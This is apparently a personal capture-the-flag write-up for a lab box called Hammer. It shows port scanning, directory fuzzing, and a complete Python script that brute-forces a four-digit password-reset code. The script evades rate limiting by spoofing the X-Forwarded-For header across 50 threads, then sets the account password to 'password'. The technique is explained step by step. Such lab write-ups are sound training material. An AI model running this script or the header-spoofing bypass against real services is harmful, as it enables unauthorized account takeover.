first of all network enumeration:

```
# found the only two port is open:

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d2:89:f2:f5:d0:2b:02:49:70:de:f5:80:db:b9:13:b7 (RSA)
|   256 77:0d:1a:bd:b0:37:45:70:39:02:0b:ce:f8:80:4d:8c (ECDSA)
|_  256 3c:a0:98:9d:a6:32:5f:93:be:9e:ae:9a:67:73:14:97 (ED25519)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

in the port 1337 their is a login page:

![[Pasted image 20260211163442.png]]

i found something in the source code of this:

```
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```

Now lets fuzz the directory using the different wordlists i found some things:

```
kali@kali:~/THM/Hammer$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u "http://10.48.154.110:1337/hmr_FUZZ"

js                 [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 37ms]
logs               [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 43ms]
images           [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 1154ms]
css              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 4053ms]
```

found some logs:

![[Pasted image 20260211170416.png]]

now we can try to enter the email in the “Forgot Password” field.  i also notice that we only have 180 seconds to enter the OTP.

i try to brutforce but their is rate limiting. so now we need to bypass the rate limiting.  i crafter a python code which brutforce the ip address and the find the 4 digit code and reset password to password.

```
#!/usr/bin/env python3

import requests
import random
import threading

URL = "http://10.48.154.110:1337/reset_password.php"
EMAIL = "tester@hammer.thm"
NUM_THREADS = 50
CODE_RANGE = 10000

stop_flag = threading.Event()

def generate_fake_ip():
    """Generate random IP for X-Forwarded-For header."""
    return f"127.0.{random.randint(0, 255)}.{random.randint(0, 255)}"


def send_new_password(session):
    """Send password change request after successful OTP."""
    new_password = "password"

    session.post(
        URL,
        data={
            "new_password": new_password,
            "confirm_password": new_password,
        },
        headers={
            "X-Forwarded-For": generate_fake_ip()
        },
    )

    print(f"[+] Password is set to: {new_password}")

def brute_force_code(session, start, end):
    for code in range(start, end):

        if stop_flag.is_set():
            return

        code_str = f"{code:04d}"

        try:
            response = session.post(
                URL,
                data={
                    "recovery_code": code_str,
                    "s": "180"
                },
                headers={
                    "X-Forwarded-For": generate_fake_ip()
                },
                allow_redirects=False,
            )

            # Success condition
            if (
                response.status_code != 302
                and "Invalid or expired recovery code!" not in response.text
                and "new_password" in response.text
            ):
                stop_flag.set()
                print(f"[+] Found recovery code: {code_str}")
                send_new_password(session)
                return

        except Exception:
            continue

def main():
    session = requests.Session()

    print("[+] Sending initial password reset request...")
    session.post(URL, data={"email": EMAIL})

    print("[+] Starting brute-force process...")

    step = CODE_RANGE // NUM_THREADS
    threads = []

    for i in range(NUM_THREADS):
        start = i * step
        end = start + step

        thread = threading.Thread(
            target=brute_force_code,
            args=(session, start, end)
        )

        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()

```

This script bypasses rate limiting mainly for **two reasons**:

##### 1.Fake IP address on every request

It sends a different `X-Forwarded-For` header each time:

```
"X-Forwarded-For": f"127.0.X.Y"
```

Many poorly configured servers use `X-Forwarded-For` to identify the client IP for rate limiting.

So instead of:

```
All requests = same IP → rate limit triggered

# The server sees:

Request 1 → 127.0.12.34  
Request 2 → 127.0.88.201  
Request 3 → 127.0.5.190  
...
```

If the backend **trusts this header without validation**, it thinks every request comes from a different IP → no per-IP limit.

⚠ This works only when:

- The app trusts `X-Forwarded-For`
- There is no proper reverse proxy validation

##### 2.Multi-threading (speed abuse)

```
num_threads = 50

50 threads send requests in parallel.

So instead of:
1 request → wait → 1 request → wait

You get:
50 requests at the same time
```

If rate limiting is weak or per-request based (not global/session-based), this overwhelms it.

now i can login by email: `tester@hammer.thm` , password: `password`

![[Pasted image 20260211175043.png]]









